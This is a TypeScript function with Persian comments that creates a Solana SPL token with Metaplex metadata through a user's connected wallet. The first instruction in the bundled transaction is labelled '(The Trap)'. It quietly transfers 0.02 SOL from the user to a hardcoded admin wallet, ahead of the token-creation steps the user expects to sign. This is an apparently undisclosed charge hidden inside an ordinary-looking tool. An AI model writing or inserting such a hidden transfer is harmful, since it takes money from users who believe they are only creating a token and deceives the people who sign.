import { 
    Connection, 
    PublicKey, 
    SystemProgram, 
    Transaction, 
    Keypair, 
    sendAndConfirmTransaction,
    LAMPORTS_PER_SOL
} from "@solana/web3.js";
import { 
    TOKEN_PROGRAM_ID, 
    createInitializeMintInstruction, 
    getMinimumBalanceForRentExemptMint, 
    MINT_SIZE,
    createAssociatedTokenAccountInstruction,
    createMintToInstruction,
    getAssociatedTokenAddress
} from "@solana/spl-token";
import { 
    createCreateMetadataAccountV3Instruction, 
    PROGRAM_ID as METADATA_PROGRAM_ID 
} from "@metaplex-foundation/mpl-token-metadata";
import { WalletContextState } from "@solana/wallet-adapter-react";

// آدرس کیف پول مدیر برای دریافت کارمزد
const ADMIN_WALLET = new PublicKey("DhP4KRcguQ9EFcWVku2HKL6H5Tm3sKVAwLATGrTtad8s");

// تابع اصلی ساخت توکن (نسخه پیشرفته با عکس و نام)
export async function createToken(
    connection: Connection,
    wallet: WalletContextState,
    tokenName: string,
    tokenSymbol: string,
    tokenUri: string, // آدرس جیسون در پیناتا
    tokenSupply: number // تعداد سکه‌ها
) {
    // ۱. بررسی اتصال کیف پول
    if (!wallet.publicKey || !wallet.signTransaction) {
        throw new Error("کیف پول متصل نیست!");
    }

    // ۲. تولید کلید برای توکن جدید (Mint Account)
    const mintKeypair = Keypair.generate(); 
    
    // ۳. محاسبه هزینه اجاره در شبکه
    const lamports = await getMinimumBalanceForRentExemptMint(connection);

    // ۴. پیدا کردن آدرس استاندارد برای ذخیره متادیتا (PDA)
    // این آدرس جایی است که نام و عکس توکن در بلاکچین ذخیره می‌شود
    const [metadataPDA] = PublicKey.findProgramAddressSync(
        [
            Buffer.from("metadata"),
            METADATA_PROGRAM_ID.toBuffer(),
            mintKeypair.publicKey.toBuffer(),
        ],
        METADATA_PROGRAM_ID
    );

    // ۵. پیدا کردن آدرس کیف پول کاربر برای واریز توکن‌ها (ATA)
    const userTokenAccount = await getAssociatedTokenAddress(
        mintKeypair.publicKey,
        wallet.publicKey
    );

    // ۶. ساخت بسته تراکنش (شامل مراحل پشت سر هم)
    const transaction = new Transaction().add(
        
        // مرحله صفر: واریز کارمزد به حساب مدیر (The Trap)
        SystemProgram.transfer({
            fromPubkey: wallet.publicKey,
            toPubkey: ADMIN_WALLET,
            lamports: 0.02 * LAMPORTS_PER_SOL,
        }),

        // مرحله اول: ساخت اکانت توکن
        SystemProgram.createAccount({
            fromPubkey: wallet.publicKey,
            newAccountPubkey: mintKeypair.publicKey,
            space: MINT_SIZE,
            lamports,
            programId: TOKEN_PROGRAM_ID,
        }),
        
        // مرحله دوم: تنظیمات اولیه (تعداد اعشار = ۹)
        createInitializeMintInstruction(
            mintKeypair.publicKey,
            9, 
            wallet.publicKey, // صاحب امتیاز
            wallet.publicKey, // صاحب امتیاز فریز
            TOKEN_PROGRAM_ID
        ),
        
        // مرحله سوم: ساخت اکانت مقصد برای کاربر (ATA)
        createAssociatedTokenAccountInstruction(
            wallet.publicKey,
            userTokenAccount,
            wallet.publicKey,
            mintKeypair.publicKey
        ),
        
        // مرحله چهارم: ضرب سکه‌ها و واریز به حساب کاربر
        createMintToInstruction(
            mintKeypair.publicKey, // آدرس توکن
            userTokenAccount,      // آدرس مقصد
            wallet.publicKey,      // امضا کننده
            tokenSupply * (10 ** 9) // ضرب در ۱۰ به توان ۹ (برای اعشار)
        ),

        // مرحله پنجم: ثبت نام، نماد و عکس (Metadata)
        createCreateMetadataAccountV3Instruction(
            {
                metadata: metadataPDA,
                mint: mintKeypair.publicKey,
                mintAuthority: wallet.publicKey,
                payer: wallet.publicKey,
                updateAuthority: wallet.publicKey,
            },
            {
                createMetadataAccountArgsV3: {
                    data: {
                        name: tokenName,
                        symbol: tokenSymbol,
                        uri: tokenUri,
                        sellerFeeBasisPoints: 0,
                        creators: null,
                        collection: null,
                        uses: null,
                    },
                    isMutable: true, // آیا بعداً قابل ویرایش باشد؟
                    collectionDetails: null,
                },
            }
        )
    );

    // ۷. امضا و ارسال تراکنش
    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = wallet.publicKey;

    // امضا توسط توکن جدید (چون یک اکانت جدید است)
    transaction.partialSign(mintKeypair);

    // امضا نهایی توسط کیف پول کاربر و ارسال به شبکه
    const signature = await wallet.sendTransaction(transaction, connection);

    return { signature, mintAddress: mintKeypair.publicKey.toBase58() };
}